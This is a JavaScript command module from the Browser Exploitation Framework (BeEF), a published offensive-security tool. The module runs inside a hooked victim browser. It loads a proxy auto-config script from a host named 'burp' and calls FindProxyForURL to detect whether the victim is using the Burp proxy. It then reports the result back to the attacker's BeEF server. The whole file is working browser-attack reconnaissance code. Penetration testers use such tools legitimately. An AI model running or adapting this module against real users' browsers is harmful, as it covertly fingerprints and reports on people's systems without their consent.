//
// Copyright (c) 2006-2017 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {

  load_script = function(url) {
    var s = document.createElement("script");
    s.type = 'text/javascript';
    s.src  = url;
    document.body.appendChild(s);
  }

  get_proxy = function() {
    try {
      var response = FindProxyForURL('', '');
      beef.debug("Response: " + response);
      beef.net.send("<%= @command_url %>", <%= @command_id %>,
        "has_burp=true&response=" + response, beef.are.status_success());
    } catch(e) {
      beef.debug("Response: " + e.message);
      beef.net.send("<%= @command_url %>", <%= @command_id %>, "has_burp=false", beef.are.status_error());
    }
  }

  load_script("http://burp/proxy.pac");
  setTimeout("get_proxy()", 10000);

});

